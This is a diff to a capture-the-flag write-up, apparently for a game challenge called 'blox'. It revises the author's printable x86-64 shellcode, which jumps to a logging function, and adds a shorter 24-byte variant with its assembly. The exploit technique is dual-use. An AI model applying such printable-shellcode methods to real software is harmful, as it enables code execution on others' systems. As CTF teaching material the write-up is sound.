@@ -301,6 +301,7 @@ pop    rdx
 pop    rax
 push   0x41414152
 xor    rdi, QWORD PTR ss:[rdx]
+pop    r8
 ```
 
 Next, we'd like to jump to `hw_log` somehow. Unfortunately, this is not easy as most of the jump instructions are not printable. However, some of the relative short jumps are printable. We could push the address we'd like to jump to, then use a relative short jump to jump down to the return at the end of the function.
@@ -314,14 +315,36 @@ push   rax
 jne    0x40043d
 ```
 
-The final shellcode:
+The final shellcode (without the quotes, note the space):
 ```
-TZXhRAAA6H3:hAAaAX52L!APu"
+'TZXhRAAA6H3:AXhAAaAX5:L!APu '
 ```
 
 Since the organizers decided to release the binary later, I wrote a custom wrapper (mostly implemented with `ptrace`) to patch the output strings to proper ANSI, provide the custom syscalls, and trigger LiveSplit on some checkpoints.
 
 Yes, that's right - <a href="./2020-09-20_23-39-47.mp4">speedrunning blox is now a thing</a>. Certainly some areas for improvement, but an excellent start for sure.
+
+## Further Improvements
+Nearly a year after solving this challenge and months after writing it up, I improved the code to make it even shorter:
+
+```nasm
+push   rsp
+pop    rdx
+pop    rax
+push   0x41414152
+xor    edi, DWORD PTR [rdx]
+push   0x41614141
+pop    rax
+xor    eax, 0x41214c32
+push   rax
+jne    0x40043d
+```
+
+Assembled, this is only 24 bytes (four less than the original).
+
+```
+TZXhRAAA3:hAAaAX52L!APu$
+```
 
 # Final Thoughts
 Overall, this was not a terribly difficult challenge, but it was certainly very interesting. I had a lot of fun solving it (and playing way too much of it after the CTF).
